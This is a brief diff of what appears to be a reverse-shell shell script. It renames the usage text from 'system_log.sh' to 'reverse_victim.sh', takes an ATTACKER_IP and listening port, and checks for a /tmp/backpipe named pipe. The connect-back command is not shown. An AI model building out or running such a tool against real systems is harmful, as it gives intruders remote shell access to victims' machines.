@@ -7,7 +7,7 @@
 
 if [ $# -lt 2 ]
 then
-    echo "USAGE: system_log.sh {ATTACKER_IP} {ATTACKER_LISTENING_PORT}"
+    echo "USAGE: reverse_victim.sh {ATTACKER_IP} {ATTACKER_LISTENING_PORT}"
 else
     if [ ! -e /tmp/backpipe ]
     then
